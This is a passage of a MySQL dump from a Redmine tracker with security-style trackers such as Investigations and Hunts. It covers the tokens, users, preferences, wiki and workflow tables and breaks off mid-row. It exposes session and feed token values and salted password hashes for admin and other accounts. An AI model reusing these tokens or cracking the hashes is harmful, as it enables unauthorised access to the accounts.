  UNIQUE KEY `tokens_value` (`value`),
  KEY `index_tokens_on_user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=47 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tokens`
--

LOCK TABLES `tokens` WRITE;
/*!40000 ALTER TABLE `tokens` DISABLE KEYS */;
INSERT INTO `tokens` VALUES (3,1,'feeds','57ac879bc99370a7277ec24676aa01178bd4fa29','2021-01-27 14:57:44','2021-01-27 14:57:44'),(10,6,'session','47bcbeb4f3dcd14cbd61f887a90e3db6869ef86d','2021-01-28 19:36:39','2021-01-28 21:29:39'),(11,6,'feeds','5911126cafabdad5044ef94e58346a4656b47035','2021-01-28 19:36:39','2021-01-28 19:36:39'),(12,14,'session','d5ca99a1fd1ec4c0db1aa28e877269c4ca324ef6','2021-01-28 20:01:01','2021-01-28 21:40:25'),(13,14,'feeds','bdb4c6f9be4fc709cb516911c9eff78e6fc2530b','2021-01-28 20:01:01','2021-01-28 20:01:01'),(14,12,'session','a64d3fd44bb6cc563d48b3072442e952754c00cf','2021-01-28 20:03:24','2021-01-28 20:20:13'),(15,12,'feeds','38c3fc8c39b9ae0bace7607023bb3d939508becb','2021-01-28 20:03:24','2021-01-28 20:03:24'),(17,11,'feeds','a1f92c8764aaf8e797d89c4e2116d12a5dc7d075','2021-01-28 20:03:48','2021-01-28 20:03:48'),(18,13,'session','f51688f318f44b5c9e7a7a92b858ae2d6322f85b','2021-01-28 20:03:59','2021-01-28 20:07:50'),(19,13,'feeds','efde0ea0fd662529702859e72fc15cf4fd177a6f','2021-01-28 20:03:59','2021-01-28 20:03:59'),(21,9,'feeds','f8067ac63229af368364a977e5cfac45765207d9','2021-01-28 20:04:17','2021-01-28 20:04:17'),(23,10,'feeds','7f61af1b20976e152c96bf817f371b81285af8db','2021-01-28 20:05:13','2021-01-28 20:05:13'),(24,5,'session','13b21977fc4c092a275cfeea00fb0e464d91364c','2021-01-28 20:05:25','2021-01-28 20:51:21'),(25,5,'feeds','b10bb0463a28a49799cea06e526e4fa57fa2a6a4','2021-01-28 20:05:25','2021-01-28 20:05:25'),(29,5,'session','756c3ee8b19208f60cafeeb373d0b6e321382c48','2021-04-16 15:29:38','2021-04-16 17:32:02'),(30,6,'session','7028516cf03b05bcd4e516178f188db45416a20c','2021-04-16 15:29:57','2021-04-26 17:21:19'),(35,1,'session','41a21406ebfba628225ccd1f145d4e61507a9079','2021-05-05 17:47:58','2021-05-05 20:11:28'),(36,1,'session','97a20d386dbd7f969890eba5cb76588d55a920fc','2021-05-05 17:57:24','2021-05-06 14:24:59'),(37,1,'session','fd023262b55f0c31eb3569adebcfac51da8d14f3','2021-05-05 18:01:45','2021-05-07 18:52:01'),(38,1,'session','e7ec6a3d2d3c83180d0da21a6a4b4d90e5e640ff','2021-05-06 13:55:33','2021-05-07 18:50:50'),(39,1,'session','15c620592555ca89596c4f8f59db9d00ac5a4659','2021-05-06 13:57:35','2021-05-06 15:55:20'),(40,1,'session','c225c672d66f4c7ee355cc8047e23f929ccd66ab','2021-05-06 14:11:16','2021-05-07 18:45:55'),(41,1,'session','014efa7947c7d914c2aa260798458177da32f2a7','2021-05-06 14:22:27','2021-05-07 18:51:41'),(42,11,'session','1ce34290000b9c8483621e3bd5bb710fd5cec1ef','2021-05-06 17:57:21','2021-05-06 18:15:30'),(43,1,'session','5f874b4881d0bdffb2c744f275ca0fa2af4edd29','2021-05-06 18:14:25','2021-05-07 18:51:34'),(44,1,'session','c46728d8d2e8c01ccf817dfaaddab9cea3f2c36a','2021-05-13 16:14:41','2021-05-13 17:58:31'),(45,1,'session','741409c34066455ef7419a555c970ee807ca35a6','2021-05-13 16:14:43','2021-05-13 18:03:50'),(46,5,'session','1f5f1bee5a102111b55941b7af3f86c7efd653cd','2021-05-13 17:56:08','2021-05-13 18:03:00');
/*!40000 ALTER TABLE `tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `trackers`
--

DROP TABLE IF EXISTS `trackers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `trackers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `description` varchar(255) DEFAULT NULL,
  `is_in_chlog` tinyint(1) NOT NULL DEFAULT '0',
  `position` int(11) DEFAULT NULL,
  `is_in_roadmap` tinyint(1) NOT NULL DEFAULT '1',
  `fields_bits` int(11) DEFAULT '0',
  `default_status_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `trackers`
--

LOCK TABLES `trackers` WRITE;
/*!40000 ALTER TABLE `trackers` DISABLE KEYS */;
INSERT INTO `trackers` VALUES (1,'Investigations','',0,1,1,228,1),(2,'Intel Queries','',0,2,1,228,1),(3,'Maintenance','',0,3,1,36,1),(4,'MP Queries','',0,4,1,228,1),(5,'Hunts','',0,5,1,132,1);
/*!40000 ALTER TABLE `trackers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_preferences`
--

DROP TABLE IF EXISTS `user_preferences`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user_preferences` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `others` text,
  `hide_mail` tinyint(1) DEFAULT '1',
  `time_zone` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_user_preferences_on_user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_preferences`
--

LOCK TABLES `user_preferences` WRITE;
/*!40000 ALTER TABLE `user_preferences` DISABLE KEYS */;
INSERT INTO `user_preferences` VALUES (1,1,'---\n:no_self_notified: \'0\'\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:recently_used_project_ids: \'1\'\n:gantt_zoom: 2\n:gantt_months: 6\n',0,''),(2,5,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n:gantt_zoom: 2\n:gantt_months: 6\n',0,''),(3,6,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,''),(4,9,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,''),(5,10,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n:activity_scope:\n- issues\n- documents\n- files\n:gantt_zoom: 2\n:gantt_months: 6\n',0,''),(6,11,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,''),(7,12,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,''),(8,13,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,''),(9,14,'---\n:no_self_notified: \'0\'\n:comments_sorting: asc\n:warn_on_leaving_unsaved: \'1\'\n:textarea_font: \'\'\n:recently_used_projects: 3\n:history_default_tab: notes\n:my_page_layout:\n  left:\n  - issuesassignedtome\n  right:\n  - issuesreportedbyme\n:my_page_settings: {}\n:recently_used_project_ids: \'1\'\n',0,'');
/*!40000 ALTER TABLE `user_preferences` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `login` varchar(255) NOT NULL DEFAULT '',
  `hashed_password` varchar(40) NOT NULL DEFAULT '',
  `firstname` varchar(30) NOT NULL DEFAULT '',
  `lastname` varchar(255) NOT NULL DEFAULT '',
  `admin` tinyint(1) NOT NULL DEFAULT '0',
  `status` int(11) NOT NULL DEFAULT '1',
  `last_login_on` datetime DEFAULT NULL,
  `language` varchar(5) DEFAULT '',
  `auth_source_id` int(11) DEFAULT NULL,
  `created_on` timestamp NULL DEFAULT NULL,
  `updated_on` timestamp NULL DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  `identity_url` varchar(255) DEFAULT NULL,
  `mail_notification` varchar(255) NOT NULL DEFAULT '',
  `salt` varchar(64) DEFAULT NULL,
  `must_change_passwd` tinyint(1) NOT NULL DEFAULT '0',
  `passwd_changed_on` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_users_on_id_and_type` (`id`,`type`),
  KEY `index_users_on_auth_source_id` (`auth_source_id`),
  KEY `index_users_on_type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin','4a5225ca32e1a55353e156827645f85a24bd511f','Redmine','Admin',1,1,'2021-05-13 16:14:41','',NULL,'2021-01-27 14:50:28','2021-01-27 14:59:01','User',NULL,'all','238dd9c4bb11e250a9b82856f29f0f67',0,'2021-01-27 14:59:01'),(2,'','','','Anonymous users',0,1,NULL,'',NULL,'2021-01-27 14:50:35','2021-01-27 14:50:35','GroupAnonymous',NULL,'',NULL,0,NULL),(3,'','','','Non member users',0,1,NULL,'',NULL,'2021-01-27 14:50:35','2021-01-27 14:50:35','GroupNonMember',NULL,'',NULL,0,NULL),(4,'','','','Anonymous',0,0,NULL,'',NULL,'2021-01-27 14:50:40','2021-01-27 14:50:40','AnonymousUser',NULL,'only_my_events',NULL,0,NULL),(5,'net1','09999548a90a396fc11ed90a101052161208772b','net','1',1,1,'2021-05-13 17:56:08','en',NULL,'2021-01-27 14:59:53','2021-01-27 14:59:53','User',NULL,'only_my_events','43596e1b349275f8c8ab890d79ba5384',0,'2021-01-27 14:59:53'),(6,'host1','a347c40322c29c3b83fac1d837262a26f0c5f096','host','1',1,1,'2021-04-16 15:29:57','en',NULL,'2021-01-27 15:00:34','2021-01-27 15:00:34','User',NULL,'only_my_events','d778da9adad8cb1a521131dca19f429e',0,'2021-01-27 15:00:34'),(7,'','','','admin',0,1,NULL,'',NULL,'2021-01-27 15:00:59','2021-01-27 15:00:59','Group',NULL,'',NULL,0,NULL),(8,'','','','operator',0,1,NULL,'',NULL,'2021-01-27 15:01:07','2021-01-27 15:01:07','Group',NULL,'',NULL,0,NULL),(9,'sbo_net1','be8821fb4f58e9488290bbf873d2f03d0ea7ba74','sbo','net1',1,1,'2021-01-28 20:04:17','en',NULL,'2021-01-28 14:51:11','2021-01-28 14:51:11','User',NULL,'none','f6412b11dea102ec4c93df3d8ab856ef',0,'2021-01-28 14:51:11'),(10,'sbo_net2','9b3399e728fb4d29bb3709fa96f449ecd76552da','sbo','net2',0,1,'2021-01-28 20:05:12','en',NULL,'2021-01-28 14:51:45','2021-01-28 14:51:45','User',NULL,'none','7275594bc84f0a137cfe4ebbbe56cc1d',0,'2021-01-28 14:51:45'),(11,'sbo_net3','fc9ba480f2e262488fd376645e58b316a5debec3','sbo','net3',0,1,'2021-05-06 17:57:21','en',NULL,'2021-01-28 14:52:14','2021-01-28 14:52:14','User',NULL,'none','0dd314c3b2ab65637ab6206bd77b6c26',0,'2021-01-28 14:52:14'),(12,'sbo_host1','a8c92d2b2ffda91bc984c57931667bdce3a54add','sbo','host1',1,1,'2021-01-28 20:03:24','en',NULL,'2021-01-28 14:52:54','2021-05-13 18:00:06','User',NULL,'none','becff537b44baf72d126954e823b6163',0,'2021-01-28 14:52:54'),(13,'sbo_host2','f2108ebf8f62f485f1fb6a6b8baa68b6668aad5c','sbo','host2',0,1,'2021-01-28 20:03:59','en',NULL,'2021-01-28 14:53:31','2021-01-28 14:53:31','User',NULL,'none','7fcfb6ddf331cb5361475c6024655ab2',0,'2021-01-28 14:53:31'),(14,'sbo_host3','b0d25c726443564a3676db09d03bea8103f58dae','sbo','host3',0,1,'2021-01-28 20:01:01','en',NULL,'2021-01-28 14:54:00','2021-01-28 14:54:00','User',NULL,'none','bcafbc83e3cd85f2e79e86623428a0e7',0,'2021-01-28 14:54:00');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `versions`
--

DROP TABLE IF EXISTS `versions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `versions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) NOT NULL DEFAULT '',
  `description` varchar(255) DEFAULT '',
  `effective_date` date DEFAULT NULL,
  `created_on` timestamp NULL DEFAULT NULL,
  `updated_on` timestamp NULL DEFAULT NULL,
  `wiki_page_title` varchar(255) DEFAULT NULL,
  `status` varchar(255) DEFAULT 'open',
  `sharing` varchar(255) NOT NULL DEFAULT 'none',
  PRIMARY KEY (`id`),
  KEY `versions_project_id` (`project_id`),
  KEY `index_versions_on_sharing` (`sharing`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `versions`
--

LOCK TABLES `versions` WRITE;
/*!40000 ALTER TABLE `versions` DISABLE KEYS */;
/*!40000 ALTER TABLE `versions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `watchers`
--

DROP TABLE IF EXISTS `watchers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `watchers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `watchable_type` varchar(255) NOT NULL DEFAULT '',
  `watchable_id` int(11) NOT NULL DEFAULT '0',
  `user_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `watchers_user_id_type` (`user_id`,`watchable_type`),
  KEY `index_watchers_on_user_id` (`user_id`),
  KEY `index_watchers_on_watchable_id_and_watchable_type` (`watchable_id`,`watchable_type`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `watchers`
--

LOCK TABLES `watchers` WRITE;
/*!40000 ALTER TABLE `watchers` DISABLE KEYS */;
/*!40000 ALTER TABLE `watchers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wiki_content_versions`
--

DROP TABLE IF EXISTS `wiki_content_versions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wiki_content_versions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `wiki_content_id` int(11) NOT NULL,
  `page_id` int(11) NOT NULL,
  `author_id` int(11) DEFAULT NULL,
  `data` longblob,
  `compression` varchar(6) DEFAULT '',
  `comments` varchar(1024) DEFAULT '',
  `updated_on` datetime NOT NULL,
  `version` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `wiki_content_versions_wcid` (`wiki_content_id`),
  KEY `index_wiki_content_versions_on_updated_on` (`updated_on`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wiki_content_versions`
--

LOCK TABLES `wiki_content_versions` WRITE;
/*!40000 ALTER TABLE `wiki_content_versions` DISABLE KEYS */;
/*!40000 ALTER TABLE `wiki_content_versions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wiki_contents`
--

DROP TABLE IF EXISTS `wiki_contents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wiki_contents` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `page_id` int(11) NOT NULL,
  `author_id` int(11) DEFAULT NULL,
  `text` longtext,
  `comments` varchar(1024) DEFAULT '',
  `updated_on` datetime NOT NULL,
  `version` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `wiki_contents_page_id` (`page_id`),
  KEY `index_wiki_contents_on_author_id` (`author_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wiki_contents`
--

LOCK TABLES `wiki_contents` WRITE;
/*!40000 ALTER TABLE `wiki_contents` DISABLE KEYS */;
/*!40000 ALTER TABLE `wiki_contents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wiki_pages`
--

DROP TABLE IF EXISTS `wiki_pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wiki_pages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `wiki_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `created_on` datetime NOT NULL,
  `protected` tinyint(1) NOT NULL DEFAULT '0',
  `parent_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `wiki_pages_wiki_id_title` (`wiki_id`,`title`),
  KEY `index_wiki_pages_on_wiki_id` (`wiki_id`),
  KEY `index_wiki_pages_on_parent_id` (`parent_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wiki_pages`
--

LOCK TABLES `wiki_pages` WRITE;
/*!40000 ALTER TABLE `wiki_pages` DISABLE KEYS */;
/*!40000 ALTER TABLE `wiki_pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wiki_redirects`
--

DROP TABLE IF EXISTS `wiki_redirects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wiki_redirects` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `wiki_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `redirects_to` varchar(255) DEFAULT NULL,
  `created_on` datetime NOT NULL,
  `redirects_to_wiki_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `wiki_redirects_wiki_id_title` (`wiki_id`,`title`),
  KEY `index_wiki_redirects_on_wiki_id` (`wiki_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wiki_redirects`
--

LOCK TABLES `wiki_redirects` WRITE;
/*!40000 ALTER TABLE `wiki_redirects` DISABLE KEYS */;
/*!40000 ALTER TABLE `wiki_redirects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wikis`
--

DROP TABLE IF EXISTS `wikis`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wikis` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL,
  `start_page` varchar(255) NOT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `wikis_project_id` (`project_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wikis`
--

LOCK TABLES `wikis` WRITE;
/*!40000 ALTER TABLE `wikis` DISABLE KEYS */;
INSERT INTO `wikis` VALUES (1,1,'Wiki',1);
/*!40000 ALTER TABLE `wikis` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `workflows`
--

DROP TABLE IF EXISTS `workflows`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `workflows` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tracker_id` int(11) NOT NULL DEFAULT '0',
  `old_status_id` int(11) NOT NULL DEFAULT '0',
  `new_status_id` int(11) NOT NULL DEFAULT '0',
  `role_id` int(11) NOT NULL DEFAULT '0',
  `assignee` tinyint(1) NOT NULL DEFAULT '0',
  `author` tinyint(1) NOT NULL DEFAULT '0',
  `type` varchar(30) DEFAULT NULL,
  `field_name` varchar(30) DEFAULT NULL,
  `rule` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `wkfs_role_tracker_old_status` (`role_id`,`tracker_id`,`old_status_id`),
  KEY `index_workflows_on_old_status_id` (`old_status_id`),
  KEY `index_workflows_on_role_id` (`role_id`),
  KEY `index_workflows_on_new_status_id` (`new_status_id`),
  KEY `index_workflows_on_tracker_id` (`tracker_id`)
) ENGINE=InnoDB AUTO_INCREMENT=415 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `workflows`
--

LOCK TABLES `workflows` WRITE;
/*!40000 ALTER TABLE `workflows` DISABLE KEYS */;
INSERT INTO `workflows` VALUES (1,1,1,2,3,0,0,'WorkflowTransition',NULL,NULL),(2,1,1,2,4,0,0,'WorkflowTransition',NULL,NULL),(3,1,2,1,3,0,0,'WorkflowTransition',NULL,NULL),(4,1,2,1,4,0,0,'WorkflowTransition',NULL,NULL),(63,5,2,0,3,0,0,'WorkflowPermission','priority_id','readonly'),(64,1,0,1,3,0,0,'WorkflowTransition',NULL,NULL),(65,2,0,1,3,0,0,'WorkflowTransition',NULL,NULL),(66,3,0,1,3,0,0,'WorkflowTransition',NULL,NULL),(67,4,0,1,3,0,0,'WorkflowTransition',NULL,NULL),(68,5,0,1,3,0,0,'WorkflowTransition',NULL,NULL),(69,1,0,5,3,0,0,'WorkflowTransition',NULL,NULL),(70,2,0,5,3,0,0,'WorkflowTransition',NULL,NULL),(71,3,0,5,3,0,0,'WorkflowTransition',NULL,NULL),(72,4,0,5,3,0,0,'WorkflowTransition',NULL,NULL),(73,5,0,5,3,0,0,'WorkflowTransition',NULL,NULL),(76,3,0,4,3,0,0,'WorkflowTransition',NULL,NULL),(80,2,0,7,3,0,0,'WorkflowTransition',NULL,NULL),(84,1,0,6,3,0,0,'WorkflowTransition',NULL,NULL),(85,2,0,6,3,0,0,'WorkflowTransition',NULL,NULL),(86,3,0,6,3,0,0,'WorkflowTransition',NULL,NULL),(87,4,0,6,3,0,0,'WorkflowTransition',NULL,NULL),(88,5,0,6,3,0,0,'WorkflowTransition',NULL,NULL),(89,1,0,2,3,0,0,'WorkflowTransition',NULL,NULL),(91,3,0,2,3,0,0,'WorkflowTransition',NULL,NULL),(93,5,0,2,3,0,0,'WorkflowTransition',NULL,NULL),(94,1,1,5,3,0,0,'WorkflowTransition',NULL,NULL),(95,2,1,5,3,0,0,'WorkflowTransition',NULL,NULL),(96,3,1,5,3,0,0,'WorkflowTransition',NULL,NULL),(97,4,1,5,3,0,0,'WorkflowTransition',NULL,NULL),(98,5,1,5,3,0,0,'WorkflowTransition',NULL,NULL),(101,3,1,4,3,0,0,'WorkflowTransition',NULL,NULL),(105,2,1,7,3,0,0,'WorkflowTransition',NULL,NULL),(109,1,1,6,3,0,0,'WorkflowTransition',NULL,NULL),(110,2,1,6,3,0,0,'WorkflowTransition',NULL,NULL),(111,3,1,6,3,0,0,'WorkflowTransition',NULL,NULL),(112,4,1,6,3,0,0,'WorkflowTransition',NULL,NULL),(113,5,1,6,3,0,0,'WorkflowTransition',NULL,NULL),(114,1,5,1,3,0,0,'WorkflowTransition',NULL,NULL),(115,2,5,1,3,0,0,'WorkflowTransition',NULL,NULL),(116,3,5,1,3,0,0,'WorkflowTransition',NULL,NULL),(117,4,5,1,3,0,0,'WorkflowTransition',NULL,NULL),(118,5,5,1,3,0,0,'WorkflowTransition',NULL,NULL),(121,3,5,4,3,0,0,'WorkflowTransition',NULL,NULL),(125,2,5,7,3,0,0,'WorkflowTransition',NULL,NULL),(129,1,5,6,3,0,0,'WorkflowTransition',NULL,NULL),(130,2,5,6,3,0,0,'WorkflowTransition',NULL,NULL),(131,3,5,6,3,0,0,'WorkflowTransition',NULL,NULL),(132,4,5,6,3,0,0,'WorkflowTransition',NULL,NULL),(133,5,5,6,3,0,0,'WorkflowTransition',NULL,NULL),(134,1,5,2,3,0,0,'WorkflowTransition',NULL,NULL),(136,3,5,2,3,0,0,'WorkflowTransition',NULL,NULL),(138,5,5,2,3,0,0,'WorkflowTransition',NULL,NULL),(189,1,6,1,3,0,0,'WorkflowTransition',NULL,NULL),(190,2,6,1,3,0,0,'WorkflowTransition',NULL,NULL),(191,3,6,1,3,0,0,'WorkflowTransition',NULL,NULL),(192,4,6,1,3,0,0,'WorkflowTransition',NULL,NULL),(193,5,6,1,3,0,0,'WorkflowTransition',NULL,NULL),(194,1,6,5,3,0,0,'WorkflowTransition',NULL,NULL),(195,2,6,5,3,0,0,'WorkflowTransition',NULL,NULL),(196,3,6,5,3,0,0,'WorkflowTransition',NULL,NULL),(197,4,6,5,3,0,0,'WorkflowTransition',NULL,NULL),(198,5,6,5,3,0,0,'WorkflowTransition',NULL,NULL),(201,3,6,4,3,0,0,'WorkflowTransition',NULL,NULL),(205,2,6,7,3,0,0,'WorkflowTransition',NULL,NULL),(209,1,6,2,3,0,0,'WorkflowTransition',NULL,NULL),(211,3,6,2,3,0,0,'WorkflowTransition',NULL,NULL),(213,5,6,2,3,0,0,'WorkflowTransition',NULL,NULL),(214,1,2,5,3,0,0,'WorkflowTransition',NULL,NULL),(215,2,2,5,3,0,0,'WorkflowTransition',NULL,NULL),(216,3,2,5,3,0,0,'WorkflowTransition',NULL,NULL),(217,4,2,5,3,0,0,'WorkflowTransition',NULL,NULL),(218,5,2,5,3,0,0,'WorkflowTransition',NULL,NULL),(221,3,2,4,3,0,0,'WorkflowTransition',NULL,NULL),(225,2,2,7,3,0,0,'WorkflowTransition',NULL,NULL),(229,1,2,6,3,0,0,'WorkflowTransition',NULL,NULL),(230,2,2,6,3,0,0,'WorkflowTransition',NULL,NULL),(231,3,2,6,3,0,0,'WorkflowTransition',NULL,NULL),(232,4,2,6,3,0,0,'WorkflowTransition',NULL,NULL),(233,5,2,6,3,0,0,'WorkflowTransition',NULL,NULL),(234,2,7,1,3,0,0,'WorkflowTransition',NULL,NULL),(235,2,7,1,4,0,0,'WorkflowTransition',NULL,NULL),(236,2,7,5,3,0,0,'WorkflowTransition',NULL,NULL),(237,2,7,5,4,0,0,'WorkflowTransition',NULL,NULL),(240,2,7,6,3,0,0,'WorkflowTransition',NULL,NULL),(241,2,7,6,4,0,0,'WorkflowTransition',NULL,NULL),(244,3,4,1,3,0,0,'WorkflowTransition',NULL,NULL),(245,3,4,1,4,0,0,'WorkflowTransition',NULL,NULL),(246,3,4,5,3,0,0,'WorkflowTransition',NULL,NULL),(247,3,4,5,4,0,0,'WorkflowTransition',NULL,NULL),(250,3,4,6,3,0,0,'WorkflowTransition',NULL,NULL),(251,3,4,6,4,0,0,'WorkflowTransition',NULL,NULL),(252,3,4,2,3,0,0,'WorkflowTransition',NULL,NULL),(253,3,4,2,4,0,0,'WorkflowTransition',NULL,NULL),(254,4,4,1,3,0,0,'WorkflowTransition',NULL,NULL),(255,4,4,1,4,0,0,'WorkflowTransition',NULL,NULL),(256,4,4,5,3,0,0,'WorkflowTransition',NULL,NULL),(257,4,4,5,4,0,0,'WorkflowTransition',NULL,NULL),(260,4,4,6,3,0,0,'WorkflowTransition',NULL,NULL),(261,4,4,6,4,0,0,'WorkflowTransition',NULL,NULL),(264,1,4,1,3,0,0,'WorkflowTransition',NULL,NULL),(265,1,4,1,4,0,0,'WorkflowTransition',NULL,NULL),(266,1,4,5,3,0,0,'WorkflowTransition',NULL,NULL),(267,1,4,5,4,0,0,'WorkflowTransition',NULL,NULL),(268,1,4,6,3,0,0,'WorkflowTransition',NULL,NULL),(269,1,4,6,4,0,0,'WorkflowTransition',